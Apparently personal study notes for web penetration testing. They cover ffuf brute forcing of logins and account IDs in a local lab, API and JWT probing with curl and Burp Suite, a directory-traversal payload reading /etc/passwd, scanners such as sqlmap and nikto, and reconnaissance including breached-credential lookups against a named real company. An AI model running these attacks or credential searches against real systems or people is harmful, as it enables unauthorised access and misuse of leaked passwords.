+1. BRUTE FORCING USERNAMES & PASSWORDS
+- here we use Burp suite to capture traffic of the website
+- look for the post request of your website in proxy tab
+- press ctrl i & go to intruder tab & hight the area you working on eg password input & press add
+- you can save the request in any file 
+- sudo apt install seclist
+- edit the request, where there's is password replace with FUZZ
+- in the terminal we use FUZZ to brute force the password
+- >ffuf -request requestfilename.txt -request-proto http -w /usr/share/seclists/Passwords/psd_file_you_to_use_to_brute_force -fs 1814 (fs filters)
+- >find /usr/share/seclist -name "*username" (finds username lists)
+
+- if want to brute force username & password
+- in leafpad or text editor, you can use any words to replace username & pswd as FUZZUSER & FUZZPASS respectively
+- >ffuf -request requestfilename.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-username_list:FUZZUSER -w /usr/share/seclists/Passwords/pswd_list:FUZZPASS
+- https://appsecexplained.gitbook.io
+
+2. BRUTE FORCING USER AUTHORIZATION or ACCESS CONTROL or USER ROLES
+- get the url of the webiste to brute force & replace with any word for username_ID 
+- such as http://localhost/labs/e0x02.php?account=0001
+- you can create a python file for a range of user_ids & save its print in tje num.txt as a wordlist
+- >ffuf -u "http://localhost/labs/e0x02.php?account=FUZZ" - w num.txt -mr "admin" (looking for admin)
+
+PRACTICAL API HACKING
+- make a connection to the API web through
+- >curl website/....
+- it returns json data in json format
+- we can proxy this data to burp suite through the local host
+- >curl --proxy http://localhost:8080 https://website/../.../..
+- >curl --proxy http://localhost:8080 https://website/../.../.. -k
+- in burp suite, the response can be seen & this is raw data
+- In APIs, POST is creating, PUT is updating, Delete is delete, get gets 
+- >curl -X POST --proxy http://localhost:8080 https://website/../.../.. -k -d '{name:"cheese cat"}' (d is data adding)
+
+BRUTE FORCING APIs
+- >curl -X POST -H "Content-Type:Application/json" -d '{"username": "newusername", "password": "newpsd"}' api_website
+- after this, you will get a jwt token for authentication made of 3 parts but the last part missing
+- the missing part is mostly the signature which can be changed but the application can detect the changed signature & fail the authentication
+- you can then go to https://jwt.io & paste the token obtained to see which infor is associated
+- But this can be done manually in kale as
+- >echo 'token_obtained' | base64 -d
+
+- >curl -X GET "api_website/...token=obtained_token"
+- this fetches the user data from that token
+
+- >curl -X POST -H "Content-Type:Application/json" -d '{"username": "newusername", "password": "newpsd"}' api_website
+- do more tasks about JWT web token hacking
+
+- >curl -X PUT -H "Content-Type:Application/json" -d '{"token": "user_web_token", "username": "newusername", "password": "newpsd"}' api_website
+- verify the updated data to see if the data has changed
+- >curl -X GET "api_website/...token=obtained_token"
+
+NB: 
+- APIs always face BROKEN FUNCTION LEVEL AUTHORIZATION where a user is required to input some data & this attack aims at entering the application thru another user's session token
+- API hacking easily be done in Burp Suite by installing a plugin/extension called AUTORISE to test authentication & authorization
+- So you need to go to extensions in the Burp Suite & serarch for this extension
+- But before installing it, you will need to first install JYTHON from the browser (jython standalone)
+- After installing JYTHON, go to extension settings in Burp Suite
+- Select location of JYTHON standard JAR file
+- refresh page, then you can install autorize
+
+- After you will to use the first method of getting tne web token of the user
+- >curl -X POST -H "Content-Type:Application/json" -d '{"username": "newusername", "password": "newpsd"}' api_website
+- save the tokens in a txt file
+- In Autorize, in temporary headers you can add- cookie: session=web_token_obtained & save the cookie with any name
+- Switch Autorize on
+- then perform an update/PUT request in the terminal as
+- >curl -X PUT --proxy localhost:8080 "Content-Type: application/json" -b "session=web_tpken" -d '{"username": "new_username", "bio": "new_user_bio", "password": "new_password"}' api_webiste
+
+FILE INCLUSION ATTACKS
+- Local File Inclusion (LFI): allows an attack to include files that are already on the target server 
+- Remote File Inclusion (RFI): allows an attack to include malicious files from an external access
+- These attacks happen when there's required input from the user which an attack can use like selecting a language
+
+- In linux, we may target a file ../../../../etc/passwd (diretory traversal till the root dir)
+- You can check payloads to from (PayloadsAllTheThings from github)
+
+   
+VULNERABILITY SCANNING
+- nikto: scans webapps(website & servers) vulns & focusses on https & http protocols
+>nikto -host 192.168.100.4
+
+- sqlmap: findings vulns in relational dbs
+>sqlmap -u 192.168.100.4
+>sqlmap --forms -u 192.168.100.4 (for a web you has forms)
+
+- nessus: purchasable in pdtn env, most known vuln scanners
+- performs attacks by using a bunch of different plugins 
+- its a client-server application
+>
+
+- openvas: open sources vuln scan tool also in pdtn env
+
+FIVE(5) STAGES OF ETHICAL HACKING
+1. Reconnence(information gattering (active or passive))
+2. Scanning & Enumeration  
+3. Exploitation
+4. Managing Acces
+5. Covering Tracks
+
+RECONNENCE
+1. Target Validation (WHOIS, nslookup, dnsrecon)
+2. Finding Subdomains (Google Fu, dig, Nmap, Sublist3r, luto, crt.sh, etc)
+3. Fingerprinting (Nmap, Wappalyzer, WhatWeb, BuiltWith, NEtcat)
+4. Data Breaches (HavelBeenPwned, Breach-Parse, WeLeakInfo)
+
+RECONNENCE OR INFO GATHERIND (TARGET: TESLA)
+1. Discovering email addresses
+- Tools: hunter.io, phonebook.cz, voilanorbert.com, clearbit a chrome extension
+
+2. Breached credentials
+- Dehashed.com, type the email obtained
+- hashes.org, enter email
+
+3. Tools
+- Whois, dig, Whatweb, nslookup, wafw00f, theHarvester, Sublist3r, Recon-ng, Maltego, Recon-ng
+- >whois domain_name eg whois google.com
+- >dig domain_name
+- >whatweb domain_name (techologies used by the domain)
+- >nslookup enter >set type=NS(name servers) or MX (email exchange servers) or SOA (Serial Numbers, origin etc) domain_name (name server of the org)
+- >wafw00f domain_name (footpriniting tool if the domain_name is behind a firewall)
+- >theHarvester -d domain_name -b browser(emails addresses, sub-domains)
+- >recon-ng
+- >--help
+- >sublist3r (finding subdomains, open ports(-p), search engines(-e), save(-O))
+- >sublist3r (professional)
+- >maltego (GUI based tool) (professional)
+
+1. Passive Reconnaissance tools
+- ip addreses (-->host domain_name)
+- nslookup domain_name
+- traceroute domain_name
+- dnsrecon -d domain_name
+- wafw00f domain_name (check firewalls)
+- dig domain_name (dig @nameserver domain_name)
+- dig domain_name NS (limit to nameserver)
+- dig domain_name ANY
+- dig domain_name MX (mail servers)
+- whois domain_name
+- netcraft (web tool)
+- dnsdumpeter (web tool)
+- whatweb domain_name
+- wappalyzer for firefox
+- builtwith extension
+- theHarvester domain_name (open source intelligence)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
